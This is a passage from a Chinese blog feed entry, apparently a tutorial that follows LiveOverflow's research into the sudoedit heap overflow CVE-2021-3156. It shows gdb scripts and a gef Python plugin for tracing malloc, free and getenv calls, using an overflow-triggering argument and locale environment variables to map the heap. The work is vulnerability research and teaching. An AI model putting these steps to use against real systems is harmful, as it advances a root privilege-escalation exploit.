src="https://img.joe1sn.top/uploads/big/8415ea76e1d7d757ab5a0a2a64b55aa8.png" alt="image-20220415130840543" /></p><p>最后发现chunk位置相差太远不同 ，根本无法利用</p><h1 id="gdb工具编写"><a class="markdownIt-Anchor" href="#gdb工具编写"></a> GDB工具编写</h1><h2 id="阶段-1"><a class="markdownIt-Anchor" href="#阶段-1"></a> 阶段 1</h2><p>要改进上面的暴力脚本，就要知道我对的分配情况，我们也可以在gdb里面在每次<code>malloc</code>下断点查看<code>size</code>参数。</p><p>更为便捷的技巧是查看<code>free</code>时候的指针的地址的值，如果是我们认识的字符串，那么我们就能控制到哪里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> breakpoint pending on</span><br><span class="line"><span class="built_in">break</span> free</span><br><span class="line">commands</span><br><span class="line"> silent</span><br><span class="line"> <span class="built_in">printf</span> <span class="string">&quot;free(): %s\n&quot;</span>,<span class="variable">$rdi</span></span><br><span class="line"> <span class="built_in">continue</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">run -s <span class="string">&#x27;SSSSSSSSSSSSSSSSSSSSSYYY\&#x27;</span></span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -x ./gdb.init /usr/local/bin/sudoedit  &gt; free_trace</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/087221d78d84e19ddbcfe7d6a788fbfc.png" alt="image-20220415123301007" /></p><p>发现有环境变量，再次尝试设置环境变量</p><p><img src="https://img.joe1sn.top/uploads/big/19f25365a5ccc6c30832bb70793e9ff3.png" alt="image-20220415123740168" /></p><p>发现根本没变，要是我们尝试更多的环境变量呢？</p><h2 id="阶段-2"><a class="markdownIt-Anchor" href="#阶段-2"></a> 阶段 2</h2><p>直接在加载环境变量（<code>getenv(3p)</code>）的时候下断点，看看用了那些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">set breakpoint pending on</span><br><span class="line"></span><br><span class="line">break getenv</span><br><span class="line">commands</span><br><span class="line"> silent</span><br><span class="line"> printf &quot;getenv(): %s\n&quot;,$rdi</span><br><span class="line"> continue</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">run -s &#x27;SSSSSSSSSSSSSSSSSSSSSYYY\&#x27;</span><br></pre></td></tr></table></figure><p>发现可以设置的环境变量值</p><p><img src="https://img.joe1sn.top/uploads/big/dc45f29e3991c2d964986b846b522f9c.png" alt="image-20220415124335590" /></p><p>再次改写脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">set breakpoint pending on</span><br><span class="line">set environment LOCPATH = HEAP0</span><br><span class="line">set environment LC_ALL = HEAP1</span><br><span class="line">set environment LC_IDENTIFICATION = HEAP2</span><br><span class="line">set environment LANG = HEAP3</span><br><span class="line">set environment LC_MEASUREMENT = HEAP4</span><br><span class="line">set environment LC_TELEPHONE = HEAP5</span><br><span class="line">set environment LC_ADDRESS = HEAP6</span><br><span class="line">set environment LC_NAME = HEAP7</span><br><span class="line">set environment LC_PAPER = HEAP8</span><br><span class="line">set environment LC_MESSAGES = HEAP9</span><br><span class="line">set environment LC_MONETARY = HEAPA</span><br><span class="line">set environment LC_COLLATE = HEAPB</span><br><span class="line">set environment LC_TIME = HEAPC</span><br><span class="line">set environment LC_NUMERIC = HEAPD</span><br><span class="line">set environment LC_CTYPE = HEAPE</span><br><span class="line">set environment GCONV_PATH = HEAPF</span><br><span class="line">set environment TZ = HEAPG</span><br><span class="line">set environment SHELL = HEAPI</span><br><span class="line"></span><br><span class="line">break free</span><br><span class="line">commands</span><br><span class="line"> silent</span><br><span class="line"> printf &quot;free(): %s\n&quot;,$rdi</span><br><span class="line"> continue</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">run -s &#x27;SSSSSSSSSSSSSSSSSSSSSYYY\&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/465ccd9c3a880d07af8a9a78aba2a03d.png" alt="image-20220415125938308" /></p><p>所以可以从这些地方下手来构建更好的暴力测试工具，同时作者也在第一份暴力测试工具中犯了很多错误。用github上的改进版本能快速找到能利用的点</p><p><img src="https://img.joe1sn.top/uploads/big/14cd70c46596227d77bdee90d7be5605.png" alt="image-20220415131006033" /></p><p>或许利用点在于覆写环境变量？</p><h2 id="阶段-3"><a class="markdownIt-Anchor" href="#阶段-3"></a> 阶段 3</h2><p>这时里exp还很远，也可以尝试下分析堆溢出过后还有哪些地方申请</p><p>作者直接写了一个gef的拓展工具</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gdb -ex &#x27;gef config gef.extra_plugins_dir &quot;/pwd/gef&quot;&#x27; -ex &#x27;gef save&#x27; -ex quit</span></span><br><span class="line"></span><br><span class="line">__AUTHOR__ = <span class="string">&quot;liveoverflow&quot;</span></span><br><span class="line">__VERSION__ = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># persist &quot;database&quot; to the file</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">j</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/malloc.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(json.dumps(j))</span><br><span class="line"></span><br><span class="line"><span class="comment"># load &quot;database&quot; from the file</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/malloc.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        j = json.loads(f.read())</span><br><span class="line">    <span class="keyword">return</span> j</span><br><span class="line"></span><br><span class="line"><span class="comment"># handler for malloc() breakpoints</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MallocBreakpoint</span>(gdb.Breakpoint):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, location, *args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">super</span>(MallocBreakpoint, self).__init__(location, gdb.BP_BREAKPOINT, internal=<span class="literal">False</span>)</span><br><span class="line">        self.silent = <span class="literal">True</span></span><br><span class="line">        self.size = <span class="literal">None</span></span><br><span class="line">        self.addr = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># malloc() breakpoint triggered</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        log = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># extract information about this malloc()</span></span><br><span class="line">        log[<span class="string">&quot;size&quot;</span>] = get_register(<span class="string">&quot;$rdi&quot;</span>)</span><br><span class="line">        log[<span class="string">&quot;rip&quot;</span>] = get_register(<span class="string">&quot;$rip&quot;</span>)</span><br><span class="line">        log[<span class="string">&quot;backtrace&quot;</span>] = gdb.execute(<span class="string">&#x27;bt&#x27;</span>, to_string=<span class="literal">True</span>)</span><br><span class="line">        log[<span class="string">&#x27;name&#x27;</span>] = gdb.newest_frame().older().name()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># set a breakpoint at the malloc() return</span></span><br><span class="line">        <span class="keyword">if</span> log[<span class="string">&#x27;name&#x27;</span>] <span class="keyword">and</span> <span class="string">&#x27;set_cmnd&#x27;</span> <span class="keyword">in</span> log[<span class="string">&#x27;name&#x27;</span>]:</span><br><span class="line">            self.retbp = MallocReturnBreakpoint(log=log, overwrite=gdb.newest_frame().older())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        self.retbp = MallocReturnBreakpoint(log=log)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># breakpoint for the return of a malloc()</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MallocReturnBreakpoint</span>(gdb.FinishBreakpoint):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, log, overwrite=<span class="literal">False</span>, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> overwrite:</span><br><span class="line">            overwrite = gdb.newest_frame()</span><br><span class="line">        <span class="built_in">super</span>(MallocReturnBreakpoint, self).__init__(overwrite, internal=<span class="literal">False</span>)</span><br><span class="line">        self.silent = <span class="literal">False</span></span><br><span class="line">        self.log = log</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># extract some information</span></span><br><span class="line">        self.log[<span class="string">&#x27;addr&#x27;</span>] = get_register(<span class="string">&quot;$rax&quot;</span>)</span><br><span class="line">        self.log[<span class="string">&#x27;name&#x27;</span>] = gdb.newest_frame().name()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># load the mallocs() we logged before</span></span><br><span class="line">        MALLOCS = load()</span><br><span class="line">        <span class="comment"># add this malloc to the known allocations</span></span><br><span class="line">        MALLOCS[<span class="built_in">str</span>(self.log[<span class="string">&#x27;addr&#x27;</span>])] = self.log</span><br><span class="line">        dump(MALLOCS)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># this is the location of our overflowing buffer</span></span><br><span class="line">        <span class="comment"># now we can dump the heap analysis</span></span><br><span class="line">        <span class="keyword">if</span> self.log[<span class="string">&#x27;name&#x27;</span>] <span class="keyword">and</span> <span class="string">&#x27;set_cmnd&#x27;</span> <span class="keyword">in</span> self.log[<span class="string">&#x27;name&#x27;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;YYYYYYYYYYY WE ARE IN!!!&quot;</span>)</span><br><span class="line">            addr = get_register(<span class="string">&quot;$rax&quot;</span>)</span><br><span class="line">            mallocs = [<span class="built_in">int</span>(a) <span class="keyword">for</span> a <span class="keyword">in</span> MALLOCS]</span><br><span class="line">            mallocs.sort()</span><br><span class="line">            SHOW = <span class="number">5</span></span><br><span class="line">            out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> mall <span class="keyword">in</span> mallocs:</span><br><span class="line">                <span class="keyword">if</span> mall &gt; addr <span class="keyword">and</span> SHOW&gt;<span class="number">0</span>:</span><br><span class="line">                    h = MALLOCS[<span class="built_in">str</span>(mall)]</span><br><span class="line">                    <span class="keyword">for</span> line <span class="keyword">in</span> h[<span class="string">&#x27;backtrace&#x27;</span>].split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>:]:</span><br><span class="line">                        <span class="keyword">if</span> line:</span><br><span class="line">                            l = line.split()</span><br><span class="line">                            <span class="built_in">print</span>(l)</span><br><span class="line">                            <span class="keyword">if</span> l[<span class="number">3</span>] != <span class="string">&#x27;??&#x27;</span>:</span><br><span class="line">                                out += (l[<span class="number">3</span>]) + <span class="string">&quot; &quot;</span></span><br><span class="line">                    out += <span class="string">&quot;\n&quot;</span></span><br><span class="line">                    SHOW -= <span class="number">1</span></span><br><span class="line">            out += <span class="string">&quot;\n&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(out)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/heap&#x27;</span> ,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(out)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># set a breakpoint on free()</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FreeBreakpoint</span>(gdb.Breakpoint):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, location, *args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">super</span>(FreeBreakpoint, self).__init__(location, gdb.BP_BREAKPOINT, internal=<span class="literal">False</span>)</span><br><span class="line">        self.silent = <span class="literal">True</span></span><br><span class="line">        self.size = <span class="literal">None</span></span><br><span class="line">        self.malloc = []</span><br><span class="line">        self.addr = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        log = &#123;&#125;</span><br><span class="line">        log[<span class="string">&quot;addr&quot;</span>] = get_register(<span class="string">&quot;$rdi&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># check if the memory freed was allocated before</span></span><br><span class="line">        MALLOCS = load()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(log[<span class="string">&quot;addr&quot;</span>]) <span class="keyword">in</span> MALLOCS:</span><br><span class="line">            <span class="comment"># remove this object from the list of allocated objects</span></span><br><span class="line">            <span class="keyword">del</span> MALLOCS[<span class="built_in">str</span>(log[<span class="string">&quot;addr&quot;</span>])]</span><br><span class="line">            dump(MALLOCS)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># the gdb command that starts the heap trace</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SudoeditCommand</span>(<span class="title class_ inherited__">GenericCommand</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Tracks a function given in parameter for arguments and return code.&quot;&quot;&quot;</span></span><br><span class="line">    _cmdline_ = <span class="string">&quot;sudoedit&quot;</span></span><br><span class="line">    _syntax_ = <span class="string">f&quot;<span class="subst">&#123;_cmdline_&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_invoke</span>(<span class="params">self, args</span>):</span><br><span class="line">        dump(&#123;&#125;)</span><br><span class="line">        self.bkps = []</span><br><span class="line">        <span class="comment"># set the breakpoints</span></span><br><span class="line">        self.bkps.append(MallocBreakpoint(location=<span class="string">&quot;__libc_malloc&quot;</span>))</span><br><span class="line">        self.bkps.append(FreeBreakpoint(location=<span class="string">&quot;__libc_free&quot;</span>))</span><br><span class="line">        <span class="comment">#self.bkps.append(MallocBreakpoint(location=&quot;malloc&quot;))</span></span><br><span class="line">        <span class="comment">#self.bkps.append(ReallocBreakpoint(location=&quot;__libc_calloc&quot;))</span></span><br><span class="line">        <span class="comment">#self.bkps.append(ReallocBreakpoint(location=&quot;__libc_realloc&quot;))</span></span><br><span class="line">        <span class="comment">#self.bkps.append(FreeBreakpoint(location=&quot;free&quot;))</span></span><br><span class="line"></span><br><span class="line">        gdb.events.exited.connect(self.cleanup)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cleanup</span>(<span class="params">self, events</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;CLEANUP!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> bp <span class="keyword">in</span> self.bkps:</span><br><span class="line">            bp.delete()</span><br><span class="line">        gdb.events.exited.disconnect(self.cleanup)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    register_external_command(SudoeditCommand())</span><br></pre></td></tr></table></figure><p>设置插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -ex &#x27;gef config gef.extra_plugins_dir &quot;/pwd/gef2&quot;&#x27; -ex &#x27;gef save&#x27; -ex quit</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -ex &#x27;set breakpoint pending on&#x27; -ex &#x27;sudoedit&#x27; -ex &#x27;r -s xxxxxxxxxxxxxxxxxx&#x27; -ex &#x27;sudoedit&#x27; -ex &#x27;continue&#x27; /usr/local/bin/sudoedit | tee heap.log</span><br></pre></td></tr></table></figure><p>主要就是跟踪<code>malloc</code>和<code>free</code>在堆溢出之后的行为</p><p><img src="https://img.joe1sn.top/uploads/big/e672b987fc044881b8c2552c9cf2fb30.png" alt="image-20220415204128487" /></p><p>只有将这个改写到暴力脚本里面，找到符合条件的Chunk</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;前文：&lt;a href=&quot;https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/&quot;&gt;https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程&lt;/p&gt;
&lt;p&gt;原始视频合集：&lt;a href=&quot;https://www.youtube.com/watch?v=uj1FTiczJSE&amp;amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx&quot;&gt;https://www.youtube.com/watch?v=uj1FTiczJSE&amp;amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原始Blog：&lt;a href=&quot;https://liveoverflow.com/why-pick-sudo-research-target-part-1/&quot;&gt;https://liveoverflow.com/why-pick-sudo-research-target-part-1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原作者代码仓库：&lt;a href=&quot;https://github.com/LiveOverflow/pwnedit&quot;&gt;https://github.com/LiveOverflow/pwnedit&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/tags/CVE/"/>
    
    <category term="fuzz" scheme="https://joe1sn.eu.org/tags/fuzz/"/>
    
  </entry>
  
</feed>
